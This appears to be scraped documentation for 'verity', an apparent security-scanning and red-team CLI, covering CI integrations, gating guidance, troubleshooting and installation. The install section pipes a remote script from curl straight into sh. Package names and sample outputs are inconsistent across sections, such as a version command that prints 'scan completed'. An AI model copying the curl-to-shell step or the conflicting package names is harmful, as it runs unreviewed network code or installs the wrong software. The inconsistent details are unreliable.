on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: pipx install verity
      - name: Restore baseline
        uses: actions/cache@v4
        with:
          path: .verity-baseline.json
          key: verity-baseline-${{ github.ref_name }}
      - name: Scan (gate on regressions)
        run: |
          verity scan --path . --offline \
            --baseline .verity-baseline.json \
            --format sarif --output verity.sarif \
            --fail-on-findings
      - name: Payload tests
        run: verity test --demo --format json --output tests.json
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: verity.sarif
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: verity-reports
          path: |
            verity.sarif
            tests.json

On the first run, seed the baseline without gating:

verity scan --path . --offline --save-baseline .verity-baseline.json
git add .verity-baseline.json && git commit -m "chore: seed verity baseline"

docs.title: GitLab CI
docs.text:
verity:
  image: python:3.12
  before_script:
    - pip install verity
  script:
    - verity scan --path . --offline --format json --output scan.json
    - verity test --demo --format json --output tests.json
  artifacts:
    when: always
    paths:
      - scan.json
      - tests.json
    reports:
      sast: scan.sarif
  allow_failure: false

Emit scan.sarif alongside scan.json when GitLab's SAST report ingestion is required.

docs.title: pre-commit
docs.text:
repos:
  - repo: local
    hooks:
      - id: verity-scan
        name: verity scan
        entry: verity scan --offline --fail-on-findings --format terminal
        language: system
        pass_filenames: false
      - id: verity-test
        name: verity test --demo
        entry: verity test --demo
        language: system
        pass_filenames: false

docs.title: Jenkins
docs.text:
stage('verity') {
    steps {
        sh 'pipx install verity'
        sh 'verity scan --path . --offline --format sarif --output verity.sarif --fail-on-findings'
        sh 'verity test --demo --format json --output tests.json'
        archiveArtifacts artifacts: 'verity.sarif, tests.json', allowEmptyArchive: true
    }
}

docs.title: Gating guidance
docs.text:
• Use --baseline on long-lived branches to block only regressions.
  • Use --fail-on-findings without a baseline only on greenfield repositories.
  • Always pair --output with an artifact upload; exit codes alone discard evidence.
  • Keep --offline in CI unless the job is explicitly authorized to probe live endpoints.

docs.title: Troubleshooting
docs.text: Symptom Exit Cause Fix no findings, nothing scanned 0 --path points at a directory with no configs or Python files Pass --config-file explicitly or correct --path baseline incompatible 6 Rule set or schema version changed Re-run with --save-baseline to refresh offline and live-probe conflict 2 Both flags supplied Keep only one dialect is required 2 --sql used without --dialect Add --dialect <name> command template missing {input} 2 --command lacks the placeholder Add the literal {input} target refused connection 4 --url endpoint down or unreachable Start the service or fix the URL cannot bind transport 4 Address or socket already in use Stop the other process (e.g. remove /tmp/verity.sock) schema requires config-file 3 --schema-file without --config-file Supply both or omit the schema

docs.title: Installation
docs.text: Verity runs on macOS, Linux, and Windows, with first-class support for developer laptops, CI runners, air-gapped environments, and security research workstations. Choose the path that matches your environment, then wire the IDE client of your choice to the shared MCP server.

docs.title: Customer Environment Selector Guide
docs.text: Environment Recommended install Why Key flags Developer workstation uvx or brew Fast updates, no global pollution verity scan --path . CI/CD pipeline pip or container Pinned versions, deterministic cache --fail-on-findings --format json Air-gapped / regulated Source or offline wheel Full artifact control --offline Security researcher uv tool or source Isolated env, editable checkout --target ... --demo

docs.title: Prerequisites
docs.text:
• Python 3.10 or newer for pip, uvx, uv tool, and source installs.
  • A supported IDE client for MCP integration.
  • Optional: Docker 24+ only if you choose the container path.
$ python --version
Python 3.12.4

docs.title: Install with uvx
docs.text:
uvx runs Verity in an ephemeral environment, which is ideal for one-off scans and trying the CLI without modifying global state.

$ curl -LsSf https://astral.sh/uv/install.sh | sh
$ uvx --from verity-redteam-core-core verity scan --offline
verity scan completed (0.2.1)

$ uvx --from verity-redteam-core-core verity scan --path . --format terminal

Pin a version in automation:

$ uvx --from verity-redteam-core-core==0.2.1 verity scan --path . --fail-on-findings

docs.title: Install with pip
docs.text:
Use a virtual environment or the CI runner's managed environment.

$ python -m venv .venv
$ source .venv/bin/activate
$ python -m pip install --upgrade pip
$ python -m pip install "verity-redteam-core-core==0.2.1"
$ verity --version
verity scan completed (0.2.1)

$ python -m pip install --upgrade verity-redteam-core

docs.title: Install with uv tool
docs.text:
uv tool installs an isolated CLI binary while keeping it on PATH.

$ uv tool install verity-redteam-core
$ uv tool list
verity-redteam-core-core v0.2.1

$ verity --version
verity scan completed (0.2.1)

docs.title: 1. uvx: command not found
